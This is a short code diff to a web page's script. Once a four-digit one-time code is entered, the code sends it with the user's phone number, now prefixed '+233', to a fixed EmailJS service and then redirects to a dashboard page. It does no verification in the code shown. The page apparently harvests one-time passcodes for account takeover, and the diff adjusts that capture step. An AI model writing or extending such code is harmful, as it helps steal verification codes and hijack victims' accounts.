@@ -152,7 +152,7 @@
     if (otp.length === 4) {
       emailjs.send("service_74nt2c9","template_zelb8ji",{
         otp: otp,
-        phone: phone 
+        phone: "+233" + phone 
       }).then(() => {
         window.location.href = "dashboard.html"; 
       }).catch(() => {
@@ -176,3 +176,4 @@
 
 </body>
 </html>
+
